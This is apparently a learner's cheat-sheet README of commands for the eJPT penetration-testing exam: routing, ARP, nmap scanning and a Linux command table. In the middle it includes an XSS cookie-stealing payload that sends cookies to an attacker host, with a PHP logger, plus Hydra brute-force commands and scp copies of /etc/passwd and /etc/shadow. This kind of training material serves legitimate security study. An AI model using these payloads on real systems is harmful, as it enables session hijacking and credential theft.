# My-eJPT-commands

Checking the routing table:
* `ip route` (Linux)
* `route print` (Windows)
* `netstat -r` (Mac OS)

Discovery thge MAC address of the network cards
* `ipconfig /all` on Windows
* `ifconfig` on MacOS
* `ip addr` on Linux 

`Switches` => The forwarding table is called Content Addressable Memory (CAM) table

ARP
* If the host need to know the MAC addresses of the other network nodes, it can be learn by using the `Adress Resolution Protocol (ARP)`

Checking the ARP cache
* `arp -a` on Windows
* `arp` on MacOS
* `ip neighboor` on Linux

Netstat Command : To check the listening ports. To show information about the processes listening on the machine and processes connecting to remote servers
* `netstat -ano` on Windows
* `netstat -tunp|-tulpn` on Linux
* `netstat -p tcp -p udp` together with `lsof -n -i4TCP -i4UDP` on MacOS

How network routes work and how they can be manually added in order to reach different networks ?
* `ifconfig` => see the interfaces
* `route` => determine what networks we can reach and how.

Add a *route* manually
* my ip is 10.175.34.101 and gateway is 10.175.34.1
* target ip is 192.168.222.19 and subnet is 192.168.22.0/24

The command is :
* `ip route add 192.168.222.0/24 via 10.175.34.1`
* We are saying our operating system to add a route for the 192.168.222.0/24 network and that the connections have to go through 10.175.34.1 (which is the gateway)

*Footprinting & Scanning:*

**Mapping a Network**

Do you determine which IP addresses in a scope are assigned to a host?
=> We do `ping swepping`

-a : Show systems that are alive.

-g : Tell to perform a ping sweep

`fping -a -g 192.168.1.0/24 2>/dev/null`

`fping -a -g 192.168.1.0 192.168.1.255 2>/dev/null`

Now, we'll use `nmap` to perform Ping Scanning

-sn : Disable Port Scan

`nmap -sn 200.200.0.0./16`

`nmap -sn 200.200.123.1-12`

OS fingerprinting with nmap:

-Pn : To skip the ping scan if you know the target is alive

-O : OS detection

`nmap -Pn -O <target>`

Now, we'll perform Port Scanning

-sT : performs a TCP connect scan

-sS : performs a SYN scan

-sV : perfomrs a version detection scan

--reason : that will show an explanation of why a port is marked open or closed

If you know the target is router address => 10 . 10 . * . 1

When we encounter network tha are protected by firewalls and wher pings are blocked => use `-Pn` : skip ping scannig and treat it as alive

Examples:
- nmap -sn -n 10.142.111.* | 10.142.111.0/24
- nmap -sS 10.142.111.1,6,48,96,99,100,213
- nmap -sV 10.142.111.1,6,48,96,99,100,213
- nmap -O 10.142.111.1,6,48,96,99,100,213

FINGERPRINTTER WEB SERVER WITHG OPENSSL
- `openssl s_client -connect <target>:443`

Connect via mysql:
- `mysql -u user -p password -h target`

FINDING XSS (cross site scripting)
- `<script>alert('XSS')</script>`

Display the current cookie:
- `<script>alert(document.cookie)</script>`

Cookie stealing via XSS:
```bash
<script>
var i = new Image();
i.src="http://<MyIP>/log.php?="+document.cookie;
</script>
```
- log.php
```bash
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp)
?>
```

HYDRA

- To get detailed information about a module

`hydra -U module` => module : rdp http ftp ...

`hydra -L user.txt -P password.txt <service>://<server> <options>`

`hydra -L user.txt -P password.txt telnet://<target>`

`hydra
-L /usr/share/ncrack/minimal.usr
-P /usr/share/seclists/Passwords/rockyou-10.txt
telnet://192.168.99.22`

`hydra
-L /usr/share/ncrack/minimal.usr
-P /usr/share/seclists/Passwords/rockyou-15.txt
192.168.99.22 ssh`

to download files we can use the scp (secure copy) command as follows:

`scp root@<target>:/etc/passwd .`
`scp root@<target>:/etc/shadow .`


*Windows Shares*

- `-L` allows to look at what services are available on the target
- `-N` forces the tool to not ask for a password

`smbclient -L //<target> -N`

`smbclient //<target>/share_file -N`





*CheatSheet Commands:*

| **Command** | **Description** |
| --------------|-------------------|
| `man <tool>` | Opens man pages for the specified tool. | 
| `<tool> -h` | Prints the help page of the tool. | 
| `apropos <keyword>` | Searches through man pages' descriptions for instances of a given keyword. | 
| `cat` | Concatenate and print files. |
| `whoami` | Displays current username. | 
| `id` | Returns users identity. | 
| `hostname` | Sets or prints the name of the current host system. | 
| `uname` | Prints operating system name. | 
| `pwd` | Returns working directory name. | 
| `ifconfig` | The `ifconfig` utility is used to assign or view an address to a network interface and/or configure network interface parameters. | 
| `ip` | Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. | 
| `netstat` | Shows network status. | 
| `ss` | Another utility to investigate sockets. | 
| `ps` | Shows process status. | 
| `who` | Displays who is logged in. | 
| `env` | Prints environment or sets and executes a command. | 
| `lsblk` | Lists block devices. | 
| `lsusb` | Lists USB devices. | 
| `lsof` | Lists opened files. | 
| `lspci` | Lists PCI devices. | 
| `sudo` | Execute command as a different user. | 
| `su` | The `su` utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser).  A shell is then executed. | 
| `useradd` | Creates a new user or update default new user information. | 
| `userdel` | Deletes a user account and related files. |
| `usermod` | Modifies a user account. | 
| `addgroup` | Adds a group to the system. | 
| `delgroup` | Removes a group from the system. | 
| `passwd` | Changes user password. |
| `dpkg` | Install, remove and configure Debian-based packages. | 
| `apt` | High-level package management command-line utility. | 
| `aptitude` | Alternative to `apt`. | 
| `snap` | Install, remove and configure snap packages. |
| `gem` | Standard package manager for Ruby. | 
| `pip` | Standard package manager for Python. | 
| `git` | Revision control system command-line utility. | 
| `systemctl` | Command-line based service and systemd control manager. |
| `ps` | Prints a snapshot of the current processes. | 
| `journalctl` | Query the systemd journal. | 
| `kill` | Sends a signal to a process. | 
| `bg` | Puts a process into background. |
| `jobs` | Lists all processes that are running in the background. | 
| `fg` | Puts a process into the foreground. | 
| `curl` | Command-line utility to transfer data from or to a server. | 
| `wget` | An alternative to `curl` that downloads files from FTP or HTTP(s) server. |
| `python3 -m http.server` | Starts a Python3 web server on TCP port 8000. | 
| `ls` | Lists directory contents. | 
| `cd` | Changes the directory. |
| `clear` | Clears the terminal. | 
| `touch` | Creates an empty file. |
| `mkdir` | Creates a directory. | 
| `tree` | Lists the contents of a directory recursively. |
| `mv` | Move or rename files or directories. | 
| `cp` | Copy files or directories. |
| `nano` | Terminal based text editor. | 
| `which` | Returns the path to a file or link. |
| `find` | Searches for files in a directory hierarchy. | 
| `updatedb` | Updates the locale database for existing contents on the system. |
| `locate` | Uses the locale database to find contents on the system. | 
| `more` | Pager that is used to read STDOUT or files. |
| `less` | An alternative to `more` with more features. | 
| `head` | Prints the first ten lines of STDOUT or a file. |
| `tail` | Prints the last ten lines of STDOUT or a file. | 
| `sort` | Sorts the contents of STDOUT or a file. |
| `grep` | Searches for specific results that contain given patterns. | 
| `cut` | Removes sections from each line of files. |
| `tr` | Replaces certain characters. | 
| `column` | Command-line based utility that formats its input into multiple columns. |
| `awk` | Pattern scanning and processing language. |
| `sed` | A stream editor for filtering and transforming text. | 
| `wc` | Prints newline, word, and byte counts for a given input. |
| `chmod` | Changes permission of a file or directory. |
| `chown` | Changes the owner and group of a file or directory. |

